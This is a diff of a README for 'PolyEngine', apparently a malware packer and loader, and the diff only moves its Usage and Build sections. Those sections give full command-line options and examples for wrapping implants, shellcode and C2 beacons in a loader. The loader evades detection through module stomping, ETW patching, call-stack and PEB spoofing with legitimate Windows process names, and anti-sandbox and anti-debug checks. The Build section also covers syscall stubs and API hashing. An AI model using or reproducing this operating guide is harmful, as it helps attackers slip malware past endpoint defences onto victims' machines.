@@ -12,6 +12,91 @@ This is a side project I've been working on for some time. I have used Claude Co
 
 ---
 
+## Usage
+
+Build order: **Stub first, then Builder** (Builder embeds `stub.bin` into `.rsrc`).
+
+Ensure `stub.bin` is in the same directory as `Builder.exe`.
+
+```
+Builder.exe <input> <output> [OPTIONS]
+
+  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)
+            Payload type is auto-detected from the MZ header — no flag needed.
+  <output>  Output executable
+
+Loader:
+  --stub <path>              Path to stub.bin  [default: ./stub.bin]
+  --preset PRINT|MEDIA|NETWORK|RANDOM
+                             Module stomping DLL preset  [default: PRINT]
+  --overload                 Module overloading instead of stomping
+                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)
+  --keep-alive               ExitThread(0) instead of ExitProcess
+                             (required for C2 implants that spawn their own threads)
+
+Payload  (PE/DLL only, silently ignored for shellcode):
+  --export <name>            DLL export to invoke after DllMain
+  --arg <string>             Argument passed to the export  [max 127 chars]
+
+Evasion  (all ON by default):
+  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]
+                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe
+                                   SearchIndexer.exe taskhostw.exe spoolsv.exe
+                                   wlrmdr.exe WMPDMC.exe hvix64.exe
+  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]
+                             (max 31 chars)
+  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]
+                             Detection threshold: 90% of <ms> elapsed
+  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]
+  --hammer-s <seconds>       API-hammer delay duration  [default: 3]
+  --disable <token,token...>  Disable one or more features (comma-separated, repeatable)
+
+  OPSEC tokens:
+    etw         EtwEventWrite patch (ETW telemetry suppression)
+    spoofing    Call-stack spoofing (VEH/HWBP)
+    peb         PEB path/cmdline spoof
+    tls         TLS anti-debug callback (patches stub.bin before embedding)
+
+  Sandbox/debug check tokens:
+    hammer      API-hammer timing delay (VirtualAlloc/Free loop)
+    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)
+    api-emu     API emulation probe (RtlComputeCrc32 identity check)
+    exec-ctrl   Execution-control semaphore (re-execution detection)
+    sleep-fwd   Sleep-forwarding detection (timing)
+    uptime      System uptime check
+    cpu         CPU count check (< 2 logical cores)
+    screen      Screen resolution check (<= 1024 px width)
+    files       Recent-files count check (< 5 RecentDocs subkeys)
+    all         Disable every token listed above
+
+Examples:
+  Builder.exe implant.exe     packed.exe
+  Builder.exe shellcode.bin   packed.exe --keep-alive
+  Builder.exe beacon.dll      packed.exe --export Start --keep-alive
+  Builder.exe payload.dll     packed.exe --export Execute --arg "calc.exe"
+  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls
+  Builder.exe implant.exe     packed.exe --overload --hammer-s 5 --uptime-min 5
+  Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
+```
+
+---
+
+## Build
+
+**Visual Studio 2022 (MSVC v143), Release|x64 only.** Open `PolyEngine.sln`.
+
+Build order matters:
+1. **Stub** project → produces `x64/Release/stub.bin` (raw binary, no PE headers)
+2. **Builder** project → produces `x64/Release/Builder.exe`
+
+`stub.bin` is a raw binary (linker entry point only). Builder reads it from disk and embeds it into the output `.rsrc` section.
+
+MASM custom build steps are configured in `Stub.vcxproj` (`HellsHall.asm`) and in the Engine projects (`DecryptorStub.asm`). No CMake, no Makefile.
+
+**To add a new API hash:** compute `Djb2HashA("ApiName")` (same algorithm as in `ApiHashing.cpp`), add a `g_Hash_*` global in `ApiHashing.h`, initialize it in `ApiHashing_InitHashes()`.
+
+---
+
 ## Architecture Overview
 
 PolyEngine consists of three separate components that together implement a **pack → encrypt → inject** pipeline:
@@ -236,75 +321,6 @@ Builder verifies at build time that at least one of the three selected DLLs has 
 
 ---
 
-## Usage
-
-Build order: **Stub first, then Builder** (Builder embeds `stub.bin` into `.rsrc`).
-
-Ensure `stub.bin` is in the same directory as `Builder.exe`.
-
-```
-Builder.exe <input> <output> [OPTIONS]
-
-  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)
-            Payload type is auto-detected from the MZ header — no flag needed.
-  <output>  Output executable
-
-Loader:
-  --stub <path>              Path to stub.bin  [default: ./stub.bin]
-  --preset PRINT|MEDIA|NETWORK|RANDOM
-                             Module stomping DLL preset  [default: PRINT]
-  --overload                 Module overloading instead of stomping
-                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)
-  --keep-alive               ExitThread(0) instead of ExitProcess
-                             (required for C2 implants that spawn their own threads)
-
-Payload  (PE/DLL only, silently ignored for shellcode):
-  --export <name>            DLL export to invoke after DllMain
-  --arg <string>             Argument passed to the export  [max 127 chars]
-
-Evasion  (all ON by default):
-  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]
-                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe
-                                   SearchIndexer.exe taskhostw.exe spoolsv.exe
-                                   wlrmdr.exe WMPDMC.exe hvix64.exe
-  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]
-                             (max 31 chars)
-  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]
-                             Detection threshold: 90% of <ms> elapsed
-  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]
-  --hammer-s <seconds>       API-hammer delay duration  [default: 3]
-  --disable <token,token...>  Disable one or more features (comma-separated, repeatable)
-
-  OPSEC tokens:
-    etw         EtwEventWrite patch (ETW telemetry suppression)
-    spoofing    Call-stack spoofing (VEH/HWBP)
-    peb         PEB path/cmdline spoof
-    tls         TLS anti-debug callback (patches stub.bin before embedding)
-
-  Sandbox/debug check tokens:
-    hammer      API-hammer timing delay (VirtualAlloc/Free loop)
-    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)
-    api-emu     API emulation probe (RtlComputeCrc32 identity check)
-    exec-ctrl   Execution-control semaphore (re-execution detection)
-    sleep-fwd   Sleep-forwarding detection (timing)
-    uptime      System uptime check
-    cpu         CPU count check (< 2 logical cores)
-    screen      Screen resolution check (<= 1024 px width)
-    files       Recent-files count check (< 5 RecentDocs subkeys)
-    all         Disable every token listed above
-
-Examples:
-  Builder.exe implant.exe     packed.exe
-  Builder.exe shellcode.bin   packed.exe --keep-alive
-  Builder.exe beacon.dll      packed.exe --export Start --keep-alive
-  Builder.exe payload.dll     packed.exe --export Execute --arg "calc.exe"
-  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls
-  Builder.exe implant.exe     packed.exe --overload --hammer-s 5 --uptime-min 5
-  Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
-```
-
----
-
 ## Project Structure
 
 ```
@@ -335,22 +351,6 @@ PolyEngine/
     ├── TlsCallback.c        — pre-EntryPoint anti-debug (PEB/heap flags, __fastfail)
     └── VehSpoof.c/h         — HWBP/VEH call stack spoofing
 ```
-
----
-
-## Build
-
-**Visual Studio 2022 (MSVC v143), Release|x64 only.** Open `PolyEngine.sln`.
-
-Build order matters:
-1. **Stub** project → produces `x64/Release/stub.bin` (raw binary, no PE headers)
-2. **Builder** project → produces `x64/Release/Builder.exe`
-
-`stub.bin` is a raw binary (linker entry point only). Builder reads it from disk and embeds it into the output `.rsrc` section.
-
-MASM custom build steps are configured in `Stub.vcxproj` (`HellsHall.asm`) and in the Engine projects (`DecryptorStub.asm`). No CMake, no Makefile.
-
-**To add a new API hash:** compute `Djb2HashA("ApiName")` (same algorithm as in `ApiHashing.cpp`), add a `g_Hash_*` global in `ApiHashing.h`, initialize it in `ApiHashing_InitHashes()`.
 
 ---
 
